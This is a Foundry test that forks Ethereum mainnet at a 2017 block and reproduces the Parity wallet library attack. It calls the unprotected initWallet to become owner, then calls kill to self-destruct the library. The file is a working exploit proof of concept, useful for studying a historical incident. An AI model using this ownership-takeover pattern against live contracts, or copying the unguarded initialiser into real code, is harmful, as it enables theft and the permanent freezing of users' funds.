// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface parity {
    function isOwner(address _addr) external view returns (bool);

    function kill(address _to) external;

    function initWallet(
        address[] memory _owners,
        uint256 _required,
        uint256 _daylimit
    ) external;
}

contract ContractTest is Test {
    parity WalletLibrary =
        parity(payable(0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4));

    address[] public owner;

    function setUp() public {
        vm.createSelectFork("mainnet", 4_501_735); //fork mainnet at block 4501735
    }

    function testExploit() public {
        WalletLibrary.isOwner(address(this)); // not a owner of contract
        owner.push(address(this));
        WalletLibrary.initWallet(owner, 0, 0);
        bool isowner = WalletLibrary.isOwner(address(this)); // you are owner of contract now
        assertTrue(isowner);
        WalletLibrary.kill(address(this));
        WalletLibrary.isOwner(address(this)); // contract destroyed, return 0
    }

    receive() external payable {}
}
